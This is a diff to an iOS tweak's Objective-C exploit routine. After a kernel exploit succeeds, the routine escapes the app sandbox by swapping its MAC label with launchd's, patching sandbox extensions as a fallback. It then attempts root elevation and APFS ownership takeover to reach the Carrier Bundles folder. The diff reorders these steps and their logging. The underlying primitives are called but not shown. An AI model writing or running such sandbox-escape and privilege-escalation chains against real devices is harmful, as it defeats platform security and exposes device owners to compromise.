@@ -627,26 +627,28 @@ static void runExploit(void) {
 
     NSLog(@"[Tweak] kexploit succeeded, escaping sandbox...");
     uint64_t self_proc_addr = proc_self();
-    int sret = sandbox_escape(self_proc_addr);
-    NSLog(@"[Tweak] sandbox_escape returned %d", sret);
 
+    // Approach A: MAC label swap (most reliable — only needs 1 pointer write,
+    // uses framework's dynamically-computed offsets for every iOS version)
+    int sret = sandbox_label_swap(self_proc_addr);
+    NSLog(@"[Tweak] sandbox_label_swap returned %d", sret);
+
+    // Approach B: ext_set patching (fallback if label swap fails)
     if (sret != 0) {
-        NSLog(@"[Tweak] sandbox escape failed, proceeding with apfs_own fallback...");
+        int eret = sandbox_escape(self_proc_addr);
+        NSLog(@"[Tweak] sandbox_escape (ext_set) returned %d", eret);
+        if (eret == 0) sret = 0;
     }
 
     // sandbox_elevate_to_root is disabled on iOS 17+ (ucred in PPL read-only zone)
-    // sandbox_escape + apfs_own are sufficient for CarrierBundles access
     int rret = sandbox_elevate_to_root(self_proc_addr);
     NSLog(@"[Tweak] sandbox_elevate_to_root returned %d, getuid()=%d", rret, getuid());
 
-    // If extension patching didn't work, try the most reliable approach:
-    // swap our MAC label with launchd's label (no sandbox restrictions at all)
     if (sret != 0) {
-        int lret = sandbox_label_swap(self_proc_addr);
-        NSLog(@"[Tweak] sandbox_label_swap returned %d", lret);
-        if (lret == 0) {
-            sret = 0;  // Mark sandbox as escaped
-        }
+        NSLog(@"[Tweak] sandbox escape NOT working — label swap and ext_set both failed");
+        NSLog(@"[Tweak] Will still attempt APFS ownership takeover (may work if kernel exploit is active)");
+    } else {
+        NSLog(@"[Tweak] Sandbox escaped successfully");
     }
 
     const char *cbPath = "/var/mobile/Library/Carrier Bundles";
